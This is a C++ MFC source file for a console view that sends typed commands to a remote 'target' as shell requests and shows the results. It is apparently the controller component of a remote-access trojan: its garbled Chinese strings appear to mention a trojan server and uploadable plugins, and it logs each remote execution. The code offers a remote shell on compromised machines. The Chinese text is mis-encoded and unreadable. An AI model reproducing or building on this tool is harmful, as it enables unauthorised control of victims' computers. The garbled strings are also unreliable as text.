// FormCmd.cpp : implementation file
//

#include "stdafx.h"
#include "FormCmd.h"
#include "CmdData.h"
#include <process.h>
#include "macro.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

CmdDataList g_CmdDataList;

/////////////////////////////////////////////////////////////////////////////
// CFormCmd
#define ID_CONSOLE 101

IMPLEMENT_DYNCREATE(CFormCmd, CFormView)

CRITICAL_SECTION CriticalSection;
int CFormCmd::staticLen = 0 ;
char CFormCmd::m_buf[255] = {0};

CFormCmd::CFormCmd():CFormView(CFormCmd::IDD)
{
	//{{AFX_DATA_INIT(CFormCmd)	
	
	//}}AFX_DATA_INIT
	InitializeCriticalSection(&CriticalSection);
	 m_eventId = 0;
}

CFormCmd::~CFormCmd()
{
	DeleteCriticalSection(&CriticalSection);
}

void CFormCmd::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFormCmd)
	// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CFormCmd, CFormView)
//{{AFX_MSG_MAP(CFormCmd)
ON_WM_SIZE()
ON_WM_TIMER()
//}}AFX_MSG_MAP
ON_NOTIFY(NM_CONSOLE_ENTER, ID_CONSOLE, OnConsoleEnter)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFormCmd diagnostics

#ifdef _DEBUG
void CFormCmd::AssertValid() const
{
	CFormView::AssertValid();
}

void CFormCmd::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CFormCmd message handlers

void CFormCmd::OnInitialUpdate() 
{
	CFormView::OnInitialUpdate();
	
	m_edit.Create(CRect(0,0,300,300),this,ID_CONSOLE);
}

void CFormCmd::OnSize(UINT nType, int cx, int cy) 
{
	CFormView::OnSize(nType, cx, cy);
	CRect rect;
	this->GetClientRect(&rect);
	
	rect.DeflateRect(-2,-2,-3,-4);
	CWnd* pWnd = GetDlgItem(ID_CONSOLE);
	if(pWnd)	pWnd->MoveWindow(&rect);
}

void CFormCmd::OnTimer(UINT nIDEvent)
{
	if(nIDEvent == m_eventId)
	{
		KillTimer(m_eventId);

		m_edit.AddTexts("������Ӧ��ʱ\r\n");	
		UpdateListDate(g_StData.guid);
		m_edit.BeginInput();
	}
}

//����NM_CONSOLE_ENTER��Ϣ�������»س�������Ϣ
void CFormCmd::OnConsoleEnter(NMHDR *pNotifyStruct, LRESULT* pResult)
{    
	NM_CONSOLEEDIT* pItem = (NM_CONSOLEEDIT*) pNotifyStruct;
	CString cmd = pItem->szText;
	cmd.TrimRight("\r\n");
	if(cmd == "")
	{
		m_edit.AddTexts("����������");
		*pResult = 0;
		return;
	}
	int count = cmd.Find("\r\n",1);
	if(count != -1)
		cmd = cmd.Left(count);

	int len = cmd.GetLength();
	if (cmd == "clear")
	{
		m_edit.Clear();
		ClearListDate(g_StData.guid);
		*pResult = 1;
		return;
	}	
	else if( len > 200)
	{
		m_edit.AddTexts("����̫��������ȷ��������");
		*pResult = 0;
		return;
	}	
	else if(!g_StData.bOnlineFlag)
	{
		m_edit.AddTexts("Ŀ���������");
		*pResult = 0;
		return;
	}
	else
	{
		EnterCriticalSection(&CriticalSection);
		memset(m_buf,0,sizeof(m_buf));
		strcpy(m_buf, cmd);
		staticLen = cmd.GetLength()+1;
		LeaveCriticalSection(&CriticalSection);
		m_edit.StopInput();
		CreateCmdThread();		

		*pResult = 1;
	}
}


void CFormCmd::AddCmdResult(int resp, const char* text, int len, bool end)
{
	if(resp == 0)
	{
		KillTimer(m_eventId);
		m_edit.AddTexts(text, len);
	}
	
	if(resp != 0 || end)
	{
		m_edit.AddTexts("\r\n");	
		UpdateListDate(g_StData.guid);
		m_edit.BeginInput();

		if(resp != 0)
		{
			CString errMsg;
			if(resp == ERR_NOTHISMODULE)
				errMsg = "ľ�����˲�֧�ָ�ģ�飬���ϴ���Ӧ�Ĳ��";
			else
				errMsg = "δ֪����";
			MessageBox(errMsg, "�����ն˲���", MB_OK|MB_ICONHAND);
		}

		KillTimer(m_eventId);
		ISite::WriteLog("����ִ̨�� %s ����%s", m_buf, (resp == 0 ? "�ɹ�" : "ʧ��"));
	}
}

//����̨�����߳�,���������������
unsigned int WINAPI CFormCmd::SendCmdThread(void* param)
{
	CFormCmd *pView = (CFormCmd *)param;

	int ret = ISite::SendCmd(CONTROL_REQUEST_SHELL, g_StData.s, pView->m_buf, staticLen);
	if(ret <= 0)
		pView->m_edit.AddTexts("Ŀ���������");

	return 1;
}

//�����߳�
void CFormCmd::CreateCmdThread()
{
	unsigned int threadId;
	HANDLE handle = (HANDLE)_beginthreadex(NULL, 0, SendCmdThread, this, 0, &threadId);
	if(handle)	::CloseHandle(handle);

	m_eventId = SetTimer(1000, 20000, NULL);
}

//���»���
void CFormCmd::UpdateListDate(const char* GUID)
{
	if(GUID == NULL || g_CmdDataList.size() == 0)
		return;
	
	for(CmdDataList::iterator it = g_CmdDataList.begin(); it != g_CmdDataList.end(); it++)
	{
		CmdData * pCmdData = &(*it);

		if(strcmp(GUID, pCmdData->strGUID) == 0)
		{
			int n = sizeof(pCmdData->strCmd);
			m_edit.GetWindowText(pCmdData->strCmd, n);
			break;
		}		
	}
	
}

//ɾ����������
void CFormCmd::ClearListDate(const char* GUID)
{
	if(GUID == NULL || g_CmdDataList.size() == 0)
		return;
	
	for(CmdDataList::iterator it = g_CmdDataList.begin(); it != g_CmdDataList.end(); it++)
	{
		CmdData * pCmdData = &(*it);
		if(strcmp(GUID, pCmdData->strGUID) == 0)
		{
			strcpy(pCmdData->strCmd, "");
			break;
		}		
	}
}

void CFormCmd::UpdateCmdView(const char* GUID, CFormCmd* pView)
{
	//�����ǰ�ڸ�ľ����û�е��ó����նˣ����
	if(g_StData.guid[0] == '\0')
	{
		if(pView) pView->m_edit.Clear();
		return;
	}

	bool find = false;
	CmdDataList::iterator it;
	for(it = g_CmdDataList.begin(); it != g_CmdDataList.end(); it++)
	{
		CmdData * pCmdData = &(*it);
		if(strcmp(GUID, pCmdData->strGUID) == 0)
		{
			find = true;
			break;
		}
	}

	//û���ҵ���GUID������һ����¼
	if(!find)
	{
		CmdData newData;
		memset(&newData, 0, sizeof(newData));
		strcpy(newData.strGUID, GUID);		
		g_CmdDataList.push_back(newData);
		if(pView)	pView->m_edit.Clear();
	}
	else
	{
		if(pView)
		{	
			CmdData * pCmdData = &(*it);
			pView->m_edit.ClearText();

			if(strcmp(pCmdData->strCmd, "") == 0)
				pView->m_edit.Clear();
			else
			{
				pView->m_edit.SetWindowText("");
				pView->m_edit.AddTexts(pCmdData->strCmd);
				pView->m_edit.BeginInput();
			}
		}
	}
}

void CFormCmd::FreeListData()
{
	for(CmdDataList::iterator it = g_CmdDataList.begin(); it != g_CmdDataList.end(); it++)
	{
		it = g_CmdDataList.erase(it);
	}
}